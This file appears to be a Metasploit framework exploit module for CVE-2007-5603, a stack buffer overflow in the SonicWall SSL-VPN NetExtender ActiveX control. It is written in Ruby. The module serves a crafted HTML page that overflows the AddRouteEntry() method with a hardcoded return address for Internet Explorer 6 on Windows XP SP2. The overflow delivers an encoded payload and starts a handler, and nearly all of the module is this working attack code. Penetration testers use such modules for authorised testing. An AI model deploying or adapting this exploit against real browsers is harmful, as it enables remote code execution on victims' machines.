##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SonicWall SSL-VPN NetExtender ActiveX Control Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in SonicWall SSL-VPN NetExtender.
        By sending an overly long string to the "AddRouteEntry()" method located
        in the NELaunchX.dll (1.0.0.26) Control, an attacker may be able to execute
        arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'MC' ],
      'References'     =>
        [
          [ 'CVE', '2007-5603'],
          [ 'OSVDB', '39069'],
          [ 'URL', 'http://www.sec-consult.com/303.html' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'         => 800,
          'BadChars'      => "\x00\x09\x0a\x0d'\\",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'IE 6 / Windows XP SP2 Pro English',     { 'Ret' => 0x7e497c7b } ], # 11/01/07
        ],
      'DisclosureDate' => '2007-11-01',
      'DefaultTarget'  => 0))
  end

  def autofilter
      false
  end

  def check_dependencies
      use_zlib
  end

  def on_request_uri(cli, request)
    # Re-generate the payload
    return if ((p = regenerate_payload(cli)) == nil)

    # Randomize some things
    vname	= rand_text_alpha(rand(100) + 1)
    strname	= rand_text_alpha(rand(100) + 1)

    # Set the exploit buffer
    sploit =  rand_text_english(36) + [target.ret].pack('V')
    sploit << p.encoded + rand_text_english(1024 - p.encoded.length)

    # Build out the message
    content = %Q|<html>
      <object classid='clsid:6EEFD7B1-B26C-440D-B55A-1EC677189F30' id='#{vname}'></object>
      <script language='javascript'>
      var #{vname} = document.getElementById('#{vname}');
      var #{strname} = new String('#{sploit}');
      #{vname}.AddRouteEntry(#{strname}, #{vname});
      </script>
      </html>
      |

    print_status("Sending #{self.name}")

    # Transmit the response to the client
    send_response_html(cli, content)

    # Handle the payload
    handler(cli)
  end
end
